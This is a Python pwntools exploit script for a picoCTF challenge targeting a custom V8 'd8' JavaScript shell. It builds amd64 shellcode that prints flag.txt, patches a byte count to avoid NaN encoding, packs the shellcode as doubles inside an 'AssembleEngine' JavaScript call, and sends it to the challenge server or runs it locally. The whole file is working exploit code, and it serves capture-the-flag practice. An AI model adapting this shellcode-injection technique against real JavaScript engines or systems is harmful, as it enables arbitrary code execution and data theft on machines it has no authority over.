#!/usr/bin/env python3

from pwn import *
import os, atexit

# Provides the executing environment of the shellcode to pwntools
# Else asm() will interpret the bytecode as 32-bit instead of 64-bit
exe = ELF("./d8")
context.binary = exe

def payload_construction():
    # Construct bytecode to cat flag.txt
    payload_asm = shellcraft.amd64.linux.cat('flag.txt', 1)

    # Change the no. of bytes to be sent in the sendfile syscall from 0x7fffffff to 0x01010101 so that the double doesn't become a NaN
    payload_asm = payload_asm.replace('0x7fffffff', '0x01010101')
    payload_bytes = asm(payload_asm)

    print(payload_asm)

    # Pad the end of payload_bytes with no-ops up till the 8-byte boundary (since doubles are 8-bytes long)
    padding = (8 - len(payload_bytes)%8) * asm(pwnlib.shellcraft.amd64.nop())
    payload_bytes += padding

    log.info(f"{payload_bytes.hex()=}")
    log.info(f"{len(payload_bytes)}")

    # Use pwntool's struct unpacking functionality to interpret the shellcode as doubles
    payload_doubles_tuple = struct.unpack('<' + 'd'*(len(payload_bytes)//8), payload_bytes)
    payload_doubles_list  = list(payload_doubles_tuple)
    return "AssembleEngine(" + str(payload_doubles_list) + ")"

def conn(payload):
    if args.LOCAL:
        # Write to a local payload.js file
        with open("payload.js", 'wb') as f:
            f.write(payload.encode())
        r = process([exe.path, "payload.js"])

        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 17805)

    return r

def cleanup():
    if os.path.exists('payload.js'):
        os.remove('payload.js')

def main():

    payload_js = payload_construction()
    log.info(f"{payload_js=}")

    r = conn(payload_js)

    if not args.LOCAL:
        r.sendlineafter(b'< 5k:', str(len(payload_js)).encode())
        r.sendlineafter(b'please!!', payload_js.encode())

    r.interactive()

if __name__ == "__main__":
    atexit.register(cleanup)
    main()
